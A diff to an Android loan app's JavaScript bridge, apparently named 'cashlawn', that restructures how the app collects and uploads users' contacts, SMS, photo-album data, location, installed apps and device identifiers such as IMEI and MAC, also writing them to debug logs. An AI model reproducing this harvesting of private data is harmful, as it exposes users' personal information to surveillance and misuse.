@@ -41,19 +41,30 @@ import com.blankj.utilcode.util.ToastUtils;
 import com.blankj.utilcode.util.Utils;
 import com.google.gson.Gson;
 import com.grew.sw.cashlawn.App;
+import com.grew.sw.cashlawn.model.AlbumInfoAuthModel;
 import com.grew.sw.cashlawn.model.AlbumInfoModel;
+import com.grew.sw.cashlawn.model.AppListInfoAuthModel;
 import com.grew.sw.cashlawn.model.AppListInfoModel;
 import com.grew.sw.cashlawn.model.AppsFlyerModel;
 import com.grew.sw.cashlawn.model.AuthInfoModel;
+import com.grew.sw.cashlawn.model.BatteryStatusData;
+import com.grew.sw.cashlawn.model.ContactInfoAuthModel;
 import com.grew.sw.cashlawn.model.ContactInfoBackModel;
 import com.grew.sw.cashlawn.model.ContactInfoModel;
+import com.grew.sw.cashlawn.model.DeviceInfoData;
 import com.grew.sw.cashlawn.model.DeviceInfoModel;
+import com.grew.sw.cashlawn.model.GeneralData;
+import com.grew.sw.cashlawn.model.GpsLatLong;
+import com.grew.sw.cashlawn.model.HardwareData;
 import com.grew.sw.cashlawn.model.ImageResponse;
 import com.grew.sw.cashlawn.model.JSCommonJSModel;
 import com.grew.sw.cashlawn.model.JsBridgeCallBackModel;
 import com.grew.sw.cashlawn.model.JsBridgeModel;
 import com.grew.sw.cashlawn.model.LocationBean;
+import com.grew.sw.cashlawn.model.PublicIpData;
+import com.grew.sw.cashlawn.model.SmsInfoAuthModel;
 import com.grew.sw.cashlawn.model.SmsInfoModel;
+import com.grew.sw.cashlawn.model.StorageData;
 import com.grew.sw.cashlawn.model.UserInfoResponse;
 import com.grew.sw.cashlawn.network.NetCallback;
 import com.grew.sw.cashlawn.network.NetClient;
@@ -357,8 +368,13 @@ public class WebJsBridge {
                         if (all) {
                             new Thread(() -> {
                                 ArrayList<ContactInfoModel> contactInfoModels = AuthDataUtil.getContactInfoModels();
-                                LogUtils.d("通讯录信息：\n" + contactInfoModels.toString());
-                                pushAuthData(jsBridgeModel, contactInfoModels, null, null, null, null, null);
+                                ContactInfoAuthModel contactInfoAuthModel = new ContactInfoAuthModel();
+                                contactInfoAuthModel.setCreate_time(DateUtil.getServerTimestamp() / 1000);
+                                contactInfoAuthModel.setList(contactInfoModels);
+
+                                LogUtils.d("通讯录信息：\n" + contactInfoAuthModel.toString());
+
+                                pushAuthData(jsBridgeModel, contactInfoAuthModel, null, null, null, null, null);
                             }).start();
                         } else {
                             callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
@@ -391,8 +407,12 @@ public class WebJsBridge {
                             }
                             imageDataUtil.start((AppCompatActivity) mContext, albumInfoModels -> {
                                 imageDataUtil.unLoadedListener();
-                                LogUtils.d("相册信息：\n" + albumInfoModels.size() + albumInfoModels.toString());
-                                pushAuthData(jsBridgeModel, null, null, null, null, null, albumInfoModels);
+                                AlbumInfoAuthModel albumInfoAuthModel = new AlbumInfoAuthModel();
+                                albumInfoAuthModel.setCreate_time(DateUtil.getServerTimestamp()/1000);
+                                albumInfoAuthModel.setList(albumInfoModels);
+
+                                LogUtils.d("相册信息：\n" + albumInfoAuthModel.toString());
+                                pushAuthData(jsBridgeModel, null, null, null, null, null, albumInfoAuthModel);
                             });
                         } else {
                             callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
@@ -424,10 +444,13 @@ public class WebJsBridge {
                         if (all) {
                             new Thread(() -> {
                                 ArrayList<SmsInfoModel> smsBeans = AuthDataUtil.getSmsInfo();
-                                if (smsBeans != null) {
-                                    LogUtils.d("短信信息：\n" + smsBeans.toString());
-                                }
-                                pushAuthData(jsBridgeModel, null, null, null, null, smsBeans, null);
+
+                                SmsInfoAuthModel smsInfoAuthModel = new SmsInfoAuthModel();
+                                smsInfoAuthModel.setCreate_time(DateUtil.getServerTimestamp() / 1000);
+                                smsInfoAuthModel.setList(smsBeans);
+                                LogUtils.d("短信信息：\n" + smsInfoAuthModel.toString());
+
+                                pushAuthData(jsBridgeModel, null, null, null, null, smsInfoAuthModel, null);
                             }).start();
                         } else {
                             callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
@@ -475,12 +498,13 @@ public class WebJsBridge {
                                         location = l;
                                     }
                                 }
-                                List<LocationBean> geoBeans = new ArrayList<>();
                                 LocationBean geoBean = new LocationBean();
                                 geoBean.setCreate_time(DateUtil.getServerTimestamp()/1000);
                                 if (location != null) {
-                                    geoBean.setLatitude(location.getLatitude() + "");
-                                    geoBean.setLongitude(location.getLongitude() + "");
+                                    GpsLatLong gpsLatLong = new GpsLatLong();
+                                    gpsLatLong.setLatitude(location.getLatitude() + "");
+                                    gpsLatLong.setLongitude(location.getLongitude() + "");
+                                    geoBean.setGps(gpsLatLong);
                                     try {
                                         Geocoder geocoder = new Geocoder(Utils.getApp(), Locale.getDefault());
                                         List<Address> addresses = geocoder.getFromLocation(location.getLatitude(), location.getLongitude(), 1);
@@ -502,9 +526,8 @@ public class WebJsBridge {
                                         e.printStackTrace();
                                     }
                                 }
-                                geoBeans.add(geoBean);
-                                LogUtils.d("位置信息：" + geoBeans.toString());
-                                pushAuthData(jsBridgeModel, null, null, null, geoBeans, null, null);
+                                LogUtils.d("位置信息：" + geoBean.toString());
+                                pushAuthData(jsBridgeModel, null, null, null, geoBean, null, null);
                             }).start();
                         } else {
                             callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
@@ -544,11 +567,19 @@ public class WebJsBridge {
                                         appListBean.setVersion_name(packageInfo.versionName);
                                         appListBean.setVersion_code(packageInfo.versionCode+"");
                                         appListBean.setFirst_install_time(packageInfo.firstInstallTime);
-                                        appListBean.setCreate_time(DateUtil.getServerTimestamp()/1000);
+                                        if ((packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
+                                            //非系统
+                                            appListBean.setIs_system("1");
+                                        } else {
+                                            appListBean.setIs_system("2");
+                                        }
                                         appListBeans.add(appListBean);
                                     }
-                                    LogUtils.d("安装信息：\n" + appListBeans.toString());
-                                    pushAuthData(jsBridgeModel, null, null, appListBeans, null, null, null);
+                                    AppListInfoAuthModel appListInfoAuthModel =new AppListInfoAuthModel();
+                                    appListInfoAuthModel.setCreate_time(DateUtil.getServerTimestamp()/1000);
+                                    appListInfoAuthModel.setList(appListBeans);
+                                    LogUtils.d("安装信息：\n" + appListInfoAuthModel.toString());
+                                    pushAuthData(jsBridgeModel, null, null, appListInfoAuthModel, null, null, null);
                                 } catch (Exception e) {
                                     e.printStackTrace();
                                     callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
@@ -601,34 +632,53 @@ public class WebJsBridge {
                                         try {
                                             deviceBean.setCreate_time(DateUtil.getServerTimestamp()/1000);
                                             deviceBean.setAudioExternal(FileUtil.getVideoExternalFiles().size());
-                                            deviceBean.setAvailableMemory(DeviceInfoUtil.getAvailableSpace());
-                                            deviceBean.setElapsedRealtime(SystemClock.elapsedRealtime());
-                                            deviceBean.setMemorySize(ComUtil.stringToLong(DeviceInfoUtil.getTotalRam()));
-                                            deviceBean.setIsUsingProxyPort(DeviceInfoUtil.isProxy());
-                                            deviceBean.setIsUsingVPN(DeviceInfoUtil.isVpn());
-                                            deviceBean.setRam_total_size(deviceBean.getMemorySize());
-                                            deviceBean.setIsUSBDebug(DeviceInfoUtil.isUsbDebug());
-                                            deviceBean.setAvailableDiskSize(deviceBean.getAvailableMemory());
-                                            deviceBean.setTotalDiskSize((deviceBean.getMemorySize()-ComUtil.stringToLong(deviceBean.getAvailableMemory()))+"");
-                                            deviceBean.setPhone_brand(Build.BRAND);
-                                            deviceBean.setCur_wifi_mac(DeviceInfoUtil.getWifiInfo());
-                                            deviceBean.setImei1(DeviceInfoUtil.getIMEI1());
-                                            deviceBean.setImei2(DeviceInfoUtil.getIMEI1());
-                                            deviceBean.setPhone_type(DeviceInfoUtil.getPhoneType());
-                                            deviceBean.setLanguage(App.get().getResources().getConfiguration().locale.getLanguage());
-                                            deviceBean.setLocale_display_language(Locale.getDefault().toString());
-                                            deviceBean.setNetwork_operator_name(DeviceInfoUtil.getOperatorName());
-                                            deviceBean.setLocale_iso_3_country(App.get().getResources().getConfiguration().locale.getISO3Country());
-                                            deviceBean.setLocale_iso_3_language(App.get().getResources().getConfiguration().locale.getISO3Language());
-                                            deviceBean.setBuild_fingerprint(Build.FINGERPRINT);
-                                            deviceBean.setCur_wifi_ssid(DeviceInfoUtil.getWifiName());
-                                            deviceBean.setDownloadFiles(FileUtil.getDownloadFiles().size());
-                                            deviceBean.setBattery_status(SparedUtils.getInt(ConsUtil.KEY_BATTERY_STATUS));
-                                            deviceBean.setIs_usb_charge(SparedUtils.getInt(ConsUtil.KEY_BATTERY_IS_USB));
-                                            deviceBean.setIs_ac_charge(SparedUtils.getInt(ConsUtil.KEY_BATTERY_IS_AC));
-                                            deviceBean.setBatteryPercentage(SparedUtils.getString(ConsUtil.KEY_BATTERY_LEVEL));
-                                            deviceBean.setBattery_temper(SparedUtils.getInt(ConsUtil.KEY_BATTERY_TEMPER)+"");
-                                            deviceBean.setBattery_health(SparedUtils.getInt(ConsUtil.KEY_BATTERY_HEALTH)+"");
+
+                                            StorageData storageData = new StorageData();
+                                            storageData.setAvailableMemory(DeviceInfoUtil.getAvailableSpace());
+                                            storageData.setElapsedRealtime(SystemClock.elapsedRealtime());
+                                            storageData.setMemorySize(ComUtil.stringToLong(DeviceInfoUtil.getTotalRam()));
+                                            storageData.setIsUsingProxyPort(DeviceInfoUtil.isProxy());
+                                            storageData.setIsUsingVPN(DeviceInfoUtil.isVpn());
+                                            storageData.setRam_total_size(storageData.getMemorySize());
+                                            storageData.setIsUSBDebug(DeviceInfoUtil.isUsbDebug());
+                                            storageData.setAvailableDiskSize(storageData.getAvailableMemory());
+                                            storageData.setTotalDiskSize((storageData.getMemorySize()-ComUtil.stringToLong(storageData.getAvailableMemory()))+"");
+                                            deviceBean.setStorage(storageData);
+
+                                            GeneralData generalData = new GeneralData();
+                                            generalData.setPhone_type(DeviceInfoUtil.getPhoneType());
+                                            generalData.setLanguage(App.get().getResources().getConfiguration().locale.getLanguage());
+                                            generalData.setLocale_display_language(Locale.getDefault().toString());
+                                            generalData.setNetwork_operator_name(DeviceInfoUtil.getOperatorName());
+                                            generalData.setLocale_iso_3_country(App.get().getResources().getConfiguration().locale.getISO3Country());
+                                            generalData.setLocale_iso_3_language(App.get().getResources().getConfiguration().locale.getISO3Language());
+                                            deviceBean.setGeneral_data(generalData);
+
+                                            HardwareData hardwareData=new HardwareData();
+                                            hardwareData.setDevice_model(Build.MODEL);
+                                            hardwareData.setImei(DeviceInfoUtil.getIMEI());
+                                            hardwareData.setSys_version(Build.VERSION.SDK_INT+"");
+                                            hardwareData.setScreenResolution(DeviceInfoUtil.getScreenResolution());
+                                            hardwareData.setManufacturerName(Build.BRAND);
+                                            deviceBean.setHardware(hardwareData);
+
+                                            PublicIpData publicIpData = new PublicIpData();
+                                            publicIpData.setFirst_ip(SparedUtils.getString(ConsUtil.KEY_PUBLIC_IP));
+                                            deviceBean.setPublic_ip(publicIpData);
+
+                                            BatteryStatusData batteryStatusData=new BatteryStatusData();
+                                            batteryStatusData.setIs_usb_charge(SparedUtils.getInt(ConsUtil.KEY_BATTERY_IS_USB));
+                                            batteryStatusData.setIs_ac_charge(SparedUtils.getInt(ConsUtil.KEY_BATTERY_IS_AC));
+                                            batteryStatusData.setBatteryPercentage(SparedUtils.getString(ConsUtil.KEY_BATTERY_LEVEL));
+                                            batteryStatusData.setBattery_temper(SparedUtils.getInt(ConsUtil.KEY_BATTERY_TEMPER)+"");
+                                            batteryStatusData.setBattery_health(SparedUtils.getInt(ConsUtil.KEY_BATTERY_HEALTH)+"");
+                                            batteryStatusData.setBatteryStatus(SparedUtils.getInt(ConsUtil.KEY_BATTERY_STATUS));
+                                            deviceBean.setBattery_status(batteryStatusData);
+
+                                            DeviceInfoData data=new DeviceInfoData();
+                                            data.setIsRooted(DeviceUtils.isDeviceRooted() ?"true":"false");
+                                            deviceBean.setDevice_info(data);
+
                                             deviceBean.setTime_zoneId(DeviceInfoUtil.getTimeZoneId());
                                             deviceBean.setKernel_version(DeviceInfoUtil.getKernelVersion());
                                             deviceBean.setCurrentSystemTime(System.currentTimeMillis()/1000+"");
@@ -641,10 +691,7 @@ public class WebJsBridge {
                                             deviceBean.setImagesInternal(FileUtil.getImagesInternalFiles().size()+"");
                                             deviceBean.setBuild_number(Build.DISPLAY);
                                             deviceBean.setMac(DeviceUtils.getMacAddress());
-                                            deviceBean.setIsRooted(DeviceUtils.isDeviceRooted() ?"true":"false");
                                             deviceBean.setBoard(Build.BOARD);
-                                            // TODO: 2022/9/2 等待接口返回ip
-//                                            deviceBean.setFirst_ip();
                                             deviceBean.setVideoInternal(FileUtil.getVideoInternalFiles().size());
                                             deviceBean.setAudioExternal(FileUtil.getAudioExternalFiles().size());
                                             deviceBean.setBuild_time(Build.TIME);
@@ -653,12 +700,14 @@ public class WebJsBridge {
                                             deviceBean.setRelease_date(Build.TIME);
                                             deviceBean.setDevice_name(DeviceInfoUtil.getDeviceName());
                                             deviceBean.setImagesExternal(FileUtil.getImagesExternalFiles().size()+"");
-                                            deviceBean.setDevice_model(Build.MODEL);
-                                            deviceBean.setImei(DeviceInfoUtil.getIMEI());
-                                            deviceBean.setSys_version(Build.VERSION.SDK_INT+"");
-                                            deviceBean.setScreenResolution(DeviceInfoUtil.getScreenResolution());
-                                            deviceBean.setManufacturerName(Build.BRAND);
                                             deviceBean.setSecurity_patch_level(Build.VERSION.SECURITY_PATCH);
+                                            deviceBean.setPhone_brand(Build.BRAND);
+                                            deviceBean.setCur_wifi_mac(DeviceInfoUtil.getWifiInfo());
+                                            deviceBean.setImei1(DeviceInfoUtil.getIMEI1());
+                                            deviceBean.setImei2(DeviceInfoUtil.getIMEI1());
+                                            deviceBean.setBuild_fingerprint(Build.FINGERPRINT);
+                                            deviceBean.setCur_wifi_ssid(DeviceInfoUtil.getWifiName());
+                                            deviceBean.setDownloadFiles(FileUtil.getDownloadFiles().size());
                                         } catch (Exception e) {
                                             e.printStackTrace();
                                         }
@@ -739,10 +788,10 @@ public class WebJsBridge {
     }
 
 
-    private void pushAuthData(JsBridgeModel models, List<ContactInfoModel> contactBeanList
+    private void pushAuthData(JsBridgeModel models, ContactInfoAuthModel contactBeanList
             , DeviceInfoModel deviceBean
-            , List<AppListInfoModel> appListBeanList, List<LocationBean> geoBeanList, List<SmsInfoModel> smsBeanList
-            , List<AlbumInfoModel> albumBeanList) {
+            , AppListInfoAuthModel appListBeanList, LocationBean geoBeanList, SmsInfoAuthModel smsBeanList
+            , AlbumInfoAuthModel albumBeanList) {
         Map<String, String> map = new HashMap<>();
         AuthInfoModel authInfoModel = new AuthInfoModel(albumBeanList, appListBeanList, contactBeanList, smsBeanList, deviceBean, geoBeanList);
         String content = new Gson().toJson(authInfoModel);
